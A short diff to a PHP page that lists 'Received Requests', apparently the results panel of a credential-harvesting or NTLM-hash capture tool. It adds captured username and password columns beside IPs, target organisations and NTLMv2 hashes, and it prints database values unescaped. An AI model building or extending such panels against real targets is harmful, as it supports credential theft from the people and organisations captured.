@@ -247,12 +247,12 @@ $result = $conn->query($sql);
 
 ?>
     <h2><FONT COLOR="#FFFFFF">Received Requests</FONT></h2>
-<TABLE BORDER=1><TR><TH>Date/Time</TH><TH>IP</TH><TH>Target</TH><TH>Org</TH><TH>Hash</TH><TH>UserAgent</TH></TR>
+<TABLE BORDER=1><TR><TH>Date/Time</TH><TH>IP</TH><TH>Target</TH><TH>Org</TH><TH>Hash</TH><TH>UserAgent</TH><TH>User</TH><TH>Pass</TH></TR>
 <?php
     // output data of each row
     while($row = $result->fetch_assoc()) {
 //$pw = $row["pass"];
-echo "<tr><td>".$row["Datetime"]."</td><td>".$row["IP"]."</td><td>".$row["Target"]."</td><td>".$row["Org"]."</td><td>".$row["NTLMv2"]."</td><td>".$row["UA"]."</td></tr>";
+echo "<tr><td>".$row["Datetime"]."</td><td>".$row["IP"]."</td><td>".$row["Target"]."</td><td>".$row["Org"]."</td><td>".$row["NTLMv2"]."</td><td>".$row["UA"]."</td><td>".$row['User']."</td><td>".$row['Pass']."</td></tr>";
     }
 
 printf($conn->error);
